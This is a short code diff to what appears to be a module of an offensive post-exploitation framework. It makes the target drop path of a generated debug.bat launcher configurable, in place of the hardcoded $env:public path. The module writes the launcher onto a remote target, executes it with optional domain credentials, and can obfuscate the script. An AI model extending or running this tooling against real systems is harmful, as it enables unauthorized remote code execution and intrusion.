@@ -76,6 +76,11 @@ class Module:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
+            },
+            'LauncherDropLocation' : {
+                'Description' : 'The location on the target where the debug.bat launcher file will be dropped.',
+                'Required' : False,
+                'Value' : '$env:public\debug.bat'
             }
         }
 
@@ -142,7 +147,7 @@ class Module:
         launcherCode = l.generate()
 
         # PowerShell code to write the launcher.bat out
-        scriptEnd = "$tempLoc = \"$env:public\debug.bat\""
+        scriptEnd = "$tempLoc = \"" + self.options['LauncherDropLocation']['Value'] + "\""
         scriptEnd += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
         scriptEnd += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
         scriptEnd += "\"Launcher bat written to $tempLoc `n\";\n"
@@ -155,7 +160,7 @@ class Module:
         if(domain and domain != ""):
             scriptEnd += "-Domain %s " %(domain)
 
-        scriptEnd += "-Cmd \"$env:public\debug.bat\""
+        scriptEnd += "-Cmd \"" + self.options['LauncherDropLocation']['Value'] + "\""
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
